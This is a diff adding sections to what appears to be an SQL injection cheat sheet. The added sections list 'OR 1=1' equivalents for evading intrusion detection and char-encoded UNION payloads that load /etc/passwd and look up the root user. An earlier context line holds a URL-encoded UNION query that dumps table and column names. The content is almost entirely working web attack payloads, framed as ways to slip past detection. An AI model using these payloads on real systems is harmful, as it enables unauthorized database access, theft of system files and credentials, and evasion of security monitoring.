@@ -63,3 +63,26 @@ Example of getting username and password fields:
 
 Example with URL encoding:	
 http://INSERTIPADDRESS/database.php?id=1%20UNION%20SELECT%201,concat%28table_name,%27:%27,%20column_name%29%20FROM%20information_schema.columns
+
+
+
+Evade IDS detection 'OR 1=1 equivelants
+---------
+
+'OR 'john' = 'john'
+'OR 'microsoft = 'micro' + 'soft'
+'OR 'movies = N'movies'
+'OR 'software' like ' soft%'
+'OR 9 > 1
+'OR 'best' > 'b'
+'OR 'whatever' IN ('whatever')
+'OR 3 BETWEEN 1 AND 7
+
+
+Evade IDS detection with Char encoding
+---------
+
+| Description                                       | Example
+| ------------------------------------------------- | ------------------------------------------------------------------------------------- |
+| Load a file in unions: string = ("/etc/passwd")   | ' union select 1,(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;    |
+| Inject a string: ("root")                         | ' union select * from users where login = char(114,111,111,116)                       |
